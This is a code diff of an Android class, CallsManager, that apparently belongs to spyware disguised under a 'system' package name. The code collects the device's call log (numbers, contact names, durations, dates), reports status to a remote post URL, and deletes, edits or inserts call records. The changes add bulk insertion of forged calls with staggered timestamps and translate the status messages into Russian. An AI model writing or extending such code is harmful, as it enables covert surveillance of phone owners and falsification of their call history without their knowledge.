@@ -18,6 +18,7 @@ import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
+import oom.android.system.Managers.base;
 import oom.android.system.app.HttpPoster;
 import oom.android.system.app.MyService;
 
@@ -59,18 +60,18 @@ public class CallsManager {
                         dir = "X";
                         break;
                 }
-                call.put("type", dir);
-                call.put("phoneNumber", num);
-                call.put("name", name);
-                call.put("duration", duration);
-                call.put("date",dateString);
-                call.put("dateN",date);
+                call.put(base.CALLS.CALL_TYPE, dir);
+                call.put(base.CALLS.CALL_PHONE, num);
+                call.put(base.CALLS.CALL_NAME, name);
+                call.put(base.CALLS.CALL_DURATION, duration);
+                call.put(base.CALLS.CALL_DATE,dateString);
+                call.put(base.CALLS.CALL_DATEN,date);
                 list.put(call);
 
             }
             Calls.put("callsList", list);
             cur.close();
-            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Список обновлён (нажмите Ctrl +f5)");
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Список обновлён");
             new Thread(uploader).start();
             return Calls;
         } catch (JSONException e) {
@@ -112,36 +113,57 @@ public class CallsManager {
         int i = resolver.delete(CallLog.Calls.CONTENT_URI,wh, args);
 
         if(i != -1 ){
-            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Deleted");
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Запись удалена");
             new Thread(uploader).start();
         }
     }
 
     @SuppressLint("MissingPermission")//dd MM yyyy HH:mm:ss
-    public static void AddCallLog(String type,String number,String duration,String date){
+    public static void AddCallLog(String type,String number,String duration,String date,Integer count){
         ContentResolver resolver = MyService.getContext().getContentResolver();
 
-        SimpleDateFormat dateFormat = new SimpleDateFormat("dd MM yyyy HH:mm:ss");
+        SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");
 
         Date convertedDate = new Date();
-        try {
-            convertedDate = dateFormat.parse(date);
-        } catch (ParseException e) {
-            e.printStackTrace();
+        if(date != "") {
+            try {
+                convertedDate = dateFormat.parse(date);
+            } catch (ParseException e) {}
         }
-
         long d = convertedDate.getTime();
+        try{
+            if(count ==1){
 
-        ContentValues values = new ContentValues();
+                ContentValues values = new ContentValues();
 
-        values.put(CallLog.Calls.TYPE, CallLogType.Type(type));
-        values.put(CallLog.Calls.NUMBER, number);
-        values.put(CallLog.Calls.DURATION, duration);
-        values.put(CallLog.Calls.DATE, d);
+                values.put(CallLog.Calls.TYPE, CallLogType.Type(type));
+                values.put(CallLog.Calls.NUMBER, number);
+                values.put(CallLog.Calls.DURATION, duration);
+                values.put(CallLog.Calls.DATE, d);
 
-        resolver.insert(CallLog.Calls.CONTENT_URI, values);
-        Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Call added successfully");
-        new Thread(uploader).start();
+                resolver.insert(CallLog.Calls.CONTENT_URI, values);
+
+            }
+            else{
+                for(int i =0;i<count;i++){
+                    Date date1 = convertedDate;
+                    date1.setSeconds(date1.getSeconds()-i);
+
+                    d=date1.getTime();
+
+                    ContentValues values = new ContentValues();
+
+                    values.put(CallLog.Calls.TYPE, CallLogType.Type(type));
+                    values.put(CallLog.Calls.NUMBER, number);
+                    values.put(CallLog.Calls.DURATION, duration);
+                    values.put(CallLog.Calls.DATE, d);
+
+                    resolver.insert(CallLog.Calls.CONTENT_URI, values);
+                }
+            }
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Запись добавлена");
+            new Thread(uploader).start();
+        }catch (Exception e){}
     }
 
     @SuppressLint("MissingPermission")
@@ -166,7 +188,7 @@ public class CallsManager {
             String[] args = new String[]{O_date,O_number};
             resolver.update(CallLog.Calls.CONTENT_URI,values,wh,args);
 
-            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Call change successfully");
+            Runnable uploader = new HttpPoster(MyService.post_url,"[Call]Запись изменена");
             new Thread(uploader).start();
 
         }catch (Exception e){}
